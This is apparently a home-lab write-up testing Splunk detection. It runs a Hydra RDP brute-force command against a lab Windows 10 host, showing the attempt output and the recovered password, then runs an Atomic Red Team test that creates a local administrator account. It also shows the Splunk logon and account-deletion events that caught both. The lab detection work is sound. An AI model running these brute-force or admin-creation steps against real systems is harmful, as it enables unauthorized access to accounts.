# Attack Simulation & Splunk Detection

## Overview
To test whether Splunk was capturing malicious activity, I set up a Kali Linux machine on the private network and ran a brute force attack against RDP on the Windows 10 target machine. Since this is a lab, I included the correct password in the wordlist. The attack succeeded and Splunk captured the event. I then installed Atomic Red Team on the domain-joined Windows client and simulated a local user creation attack to further verify Splunk was catching unauthorized activity.

---

## Test 1 — Hydra RDP Brute Force

**Tool:** Hydra  
**Target:** 192.168.100.100 (Windows 10 domain machine)  
**User:** jsmith  
**Method:** RDP brute force with a custom wordlist

```bash
hydra -l jsmith -P passwords.txt -V -f 192.168.100.100 rdp
```

**Output:**
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 4 tasks per 1 server, overall 4 tasks, 23 login tries (l:1/p:23)
[DATA] attacking rdp://192.168.100.100:3389/
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "david" - 1 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "123456" - 2 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "12345" - 3 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "123456789" - 4 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "password" - 5 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "iloveyou" - 6 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "princess" - 7 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "1234567" - 8 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "rockyou" - 9 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "12345678" - 10 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "abc123" - 11 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "nicole" - 12 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "daniel" - 13 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "babygirl" - 14 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "monkey" - 15 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "lovely" - 16 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "jessica" - 17 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "654321" - 18 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "michael" - 19 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "ashley" - 20 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "qwerty" - 21 of 23
[ATTEMPT] target 192.168.100.100 - login "jsmith" - pass "test.pass@word305" - 22 of 23
[3389][rdp] host: 192.168.100.100   login: jsmith   password: test.pass@word305     <-- Successful hit
1 of 1 target successfully completed, 1 valid password found
```

### Detection — Splunk EventCode 4624

Searched Splunk for EventCode 4624 (successful logon). The log confirmed the attack was captured.

```
06/03/2026 11:34:52.739 PM
LogName=Security
EventCode=4624
EventType=0
ComputerName=target-pc.clarklabs.test
Keywords=Audit Success
TaskCategory=Logon

Logon Information:
    Logon Type:         3

New Logon:
    Account Name:       jsmith
    Account Domain:     CLARKLABS

Network Information:
    Workstation Name:   kali                        <-- Attacking machine hostname
    Source Network Address: 192.168.100.254         <-- Attacking machine IP

Detailed Authentication Information:
    Authentication Package: NTLM
    Package Name (NTLM only): NTLM V2
    Key Length: 128
```

> [!NOTE]
> **Workstation Name: kali** — attacking machine hostname
> **Source Network Address: 192.168.100.254** — attacking machine IP

---

## Test 2 — Atomic Red Team T1136.001 (Create Local User)

**Tool:** Atomic Red Team  
**Technique:** [T1136.001](https://attack.mitre.org/techniques/T1136/001/) — Create Account: Local Account  
**Target:** 192.168.100.100 (domain-joined Windows 10 machine)  
**Goal:** Verify Splunk captures unauthorized local user creation

```powershell
Invoke-AtomicTest T1136.001
```

**Output:**
```
Executing test: T1136.001-5 Create a new user in PowerShell
Name                 Enabled Description
----                 ------- -----------
T1136.001_PowerShell True
Exit code: 0
Done executing test: T1136.001-5 Create a new user in PowerShell

Executing test: T1136.001-8 Create a new Windows admin user
The command completed successfully.
Exit code: 0
Done executing test: T1136.001-8 Create a new Windows admin user

Executing test: T1136.001-9 Create a new Windows admin user via .NET
User 'NewLocalUser' created successfully.        <-- New user created
User 'NewLocalUser' added to the 'Administrators' group.
User name:    NewLocalUser
Account active: Yes
Local Group Memberships: *Administrators
User 'NewLocalUser' deleted successfully.
Exit code: 0
Done executing test: T1136.001-9 Create a new Windows admin user via .NET
```

### Detection — Splunk EventCode 4726

Searched Splunk for `index="endpoint" NewLocalUser`. The telemetry appeared immediately, confirming Splunk is capturing unauthorized account activity.

```
06/04/2026 12:19:16.272 AM
LogName=Security
EventCode=4726
EventType=0
ComputerName=target-pc.clarklabs.test
Keywords=Audit Success
TaskCategory=User Account Management

Subject:
    Account Name:   admin-server
    Account Domain: CLARKLABS

Target Account:
    Account Name:   NewLocalUser             <-- The user created by the attack
    Account Domain: TRAGET-PC
```

> [!NOTE]
> **Account Name: NewLocalUser** — the unauthorized account created and deleted by the test

---

## Key Takeaways

- Splunk captured both attacks in real time
- The brute force log (EventCode 4624) identified the attacking machine by hostname (**kali**) and IP (**192.168.100.254**), giving a SOC analyst everything needed to isolate the threat
- The Atomic Red Team test (EventCode 4726) confirmed Splunk is monitoring account management events on domain-joined endpoints
- Together these tests validate that the SIEM is functional and would alert a security team to both network-based and host-based attacks